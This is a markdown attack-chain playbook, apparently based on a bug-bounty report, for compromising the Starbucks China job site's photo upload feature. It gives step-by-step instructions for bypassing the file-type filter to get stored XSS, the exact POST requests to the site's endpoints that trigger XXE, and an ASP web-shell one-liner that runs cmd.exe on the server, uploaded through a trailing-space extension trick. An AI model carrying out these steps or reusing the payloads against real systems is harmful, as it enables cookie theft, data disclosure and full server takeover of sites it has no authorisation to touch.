---
tags:
  - xxe
  - xss
  - file-upload
  - rce
  - web-vulnerability
type: attack_chain
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
commands:
  - '[[commands/post-xxe-trigger-via-hxdynamicpage]]'
  - '[[commands/post-xxe-trigger-via-hxxmlservice]]'
  - '[[commands/asp-rce-code]]'
  - '[[commands/cmd-whoami]]'
platforms:
  - Web
  - Windows
complexity: medium
procedures:
  - '[[procedures/Bypass-File-Type-Restrictions-for-Stored-XSS-via-HTML-Upload]]'
  - '[[procedures/Exploit-XXE-via-Malicious-XML-Upload]]'
  - '[[procedures/Achieve-RCE-via-Arbitrary-ASP-File-Upload]]'
step_count: 3
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Server Software Component]]'
description: >-
  Multi-stage attack exploiting XXE, stored XSS, and arbitrary file upload
  vulnerabilities in Starbucks' China job site to achieve remote code execution.
skill_level: intermediate
impact_level: high
id: 7edaad63-267e-4b97-81f6-0669b91d3332
created_at: '2025-12-13T09:00:33.877Z'
updated_at: '2025-12-13T09:00:33.878Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
  - '[[Discovery]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[Command-Line Interface]]'
  - '[[Server Software Component]]'
---
# Chained XXE, Stored XSS, and Arbitrary File Upload to RCE on Starbucks Job Site

Multi-stage attack chain demonstrating exploitation of vulnerabilities in the photo upload feature of Starbucks' job site in China, starting with stored XSS via HTML upload, escalating to XXE for information disclosure, and culminating in RCE through arbitrary ASP file upload.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 3 |
| Execution Time | ~15 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Initial Access via File Upload Bypass] --> B[XXE Exploitation]
    B --> C[RCE via ASP Upload]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
```

## Prerequisites & Requirements

### Required Tools

- [[tools/Burp-Suite]]

### Target Environment

- Web application on ASP.NET with IIS 7.5
- Windows server
- Access to upload endpoint at https://ecjobs.starbucks.com.cn

### Initial Access Requirements

- Valid user account on the site
- Network access to the target URL
- No prior elevated privileges needed

## Detailed Attack Procedures

### Step 1: Bypass File Type Restrictions for Stored XSS
procedure: [[procedures/Bypass-File-Type-Restrictions-for-Stored-XSS-via-HTML-Upload]]

**Objective**: Upload an HTML file to trigger stored XSS, enabling cookie theft or user spoofing.

**Instructions**: Log in and navigate to the photo upload page. Use [[tools/Burp-Suite]] to intercept the upload request. Modify the 'allow_file_type_list' parameter to include 'html;' or delete it, and change the filename to end with '.html'. Forward the request to upload the file.

Access the uploaded file at a URL like https://ecjobs.starbucks.com.cn/retail/tempfiles/temp_uploaded_641dee35-5a62-478e-90d7-f5558a78c60e.html to execute the XSS payload.

**Expected Output**: The HTML file renders with embedded scripts, confirming stored XSS.

**Success Indicators**:
- HTML file successfully uploaded and accessible
- JavaScript executes on access

### Step 2: Exploit XXE via Malicious XML Upload
procedure: [[procedures/Exploit-XXE-via-Malicious-XML-Upload]]

**Objective**: Upload and trigger parsing of a malicious XML file to exploit XXE, disclosing server information or causing DoS.

**Instructions**: Using [[tools/Burp-Suite]], upload an XML file with external entities. Modify the POST request to /retail/hxpublic_v6/hxdynamicpage6.aspx using [[commands/post-xxe-trigger-via-hxdynamicpage]]:

```bash
POST /retail/hxpublic_v6/hxdynamicpage6.aspx?_hxpage=tempfiles/temp_uploaded_d4e4c8c5-c4ab-4743-a6fd-c2d779a29734.xml&max_file_size_kb=1024&allow_file_type_list=xml;jpg;jpeg;png;bmp;
```

Alternatively, use [[commands/post-xxe-trigger-via-hxxmlservice]]:

```bash
POST /retail/hxpublic_v6/hxxmlservice6.aspx HTTP/1.1
HX_PAGE_NAME="tempfiles/temp_uploaded_71cc275c-64fc-40fc-a9cc-52cce5a02858.xml"
```

**Expected Output**: Server fetches external DTD, potentially disclosing files or NTLM hashes.

**Success Indicators**:
- Server requests to external entity observed
- Information disclosure in responses

### Step 3: Achieve RCE via Arbitrary ASP File Upload
procedure: [[procedures/Achieve-RCE-via-Arbitrary-ASP-File-Upload]]

**Objective**: Upload an ASP file with malicious code to execute arbitrary commands on the server.

**Instructions**: Bypass restrictions by adding a space after the '.asp' extension in the filename (e.g., 'file.asp '). Embed code using [[commands/asp-rce-code]]:

```asp
<%response.write server.createobject("wscript.shell").exec("cmd.exe /c whoami").stdout.readall%>
```

This executes [[commands/cmd-whoami]] on the server. Access the uploaded ASP file to trigger execution.

**Expected Output**: Output of the executed command, such as the server username.

**Success Indicators**:
- ASP file uploaded and executed
- Command output returned in response

## Attack Chain Summary

### Key Achievements

1. Stored XSS for user data theft
2. XXE for server information disclosure and potential DoS
3. RCE for full server compromise

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Exploit Public-Facing Application]]
- [[Command-Line Interface]]
- [[Server Software Component]]

### MITRE ATT&CK Tactics

- [[Initial Access]]
- [[Execution]]
- [[Discovery]]

*Last updated: 2023-10-01*
